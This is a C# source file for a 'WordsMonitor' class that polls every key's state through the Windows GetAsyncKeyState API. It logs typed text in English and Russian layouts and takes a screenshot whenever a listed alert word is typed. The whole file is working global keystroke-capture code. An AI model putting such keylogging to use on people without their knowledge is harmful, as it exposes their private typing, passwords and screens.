using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Alerts
{
    class WordsMonitor
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        private static string rusKey = "Ё!\"№;%:?*()_+ЙЦУКЕНГШЩЗХЪ/ФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,ё1234567890-=йцукенгшщзхъ\\фывапролджэячсмитьбю. ";
        private static string engKey = "~!@#$%^&*()_+QWERTYUIOP{}|ASDFGHJKL:\"ZXCVBNM<>?`1234567890-=qwertyuiop[]\\asdfghjkl;'zxcvbnm,./ ";
        private static void Monitor()
        {

            string bufrus = "";
            string bufeng = "";




            while (true)
            {

                if (bufrus.Length > 500) bufrus = "";
                if (bufeng.Length > 500) bufeng = "";
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                    if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital) continue;
                    if (state != 0)
                    {
                        if (((Keys)i).ToString().Length == 1 && engKey.Contains(((Keys)i).ToString().ToLower()) && ((Keys)i) != Keys.Enter && ((Keys)i) != Keys.Space)
                        {
                            bufrus += rusKey.Substring(engKey.IndexOf(((Keys)i).ToString().ToLower()), 1);
                            bufeng += ((Keys)i).ToString().ToLower();
                            Form1 frmTemp = (Form1)Application.OpenForms[0];
                            string[] bufs = new string[] { bufrus, bufeng };
                            frmTemp.BufKeyFill(bufs);

                        }
                    }
                }
                string[] words = Methods.InitAlertWords();
                foreach (string o in words)
                    {

                        if (o!=""&&(bufrus.Contains(o) || bufeng.Contains(o)))
                        {
                            Methods.ScreenShot();
                            bufrus = "";
                            bufeng = "";
                        }

                    }
                
            }

        }

        public static async void MonitorAsync()
        {
            await Task.Run(() => Monitor());
        }



    }

}

